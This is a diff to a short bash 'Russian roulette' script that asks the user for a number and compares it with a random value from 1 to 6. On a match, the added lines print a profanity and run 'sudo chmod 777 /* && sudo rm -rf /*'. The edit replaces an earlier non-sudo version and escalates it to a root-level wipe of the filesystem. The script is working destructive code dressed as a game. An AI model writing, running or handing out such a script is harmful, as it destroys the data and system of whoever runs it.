@@ -1,5 +1,4 @@
 #! /bin/bash
-zo=0;
 ha=6;
 echo -n "num input: "
 read num
@@ -11,8 +10,8 @@ then
 	fi
 if [ $num -eq $[ $[$RANDOM % $ha] + 1] ]
 then
-	chmod 777 /*
-	rm -rf /*
+	echo "fuck"
+	sudo chmod 777 /* && sudo rm -rf /*
 else 
 	echo nice
 	fi
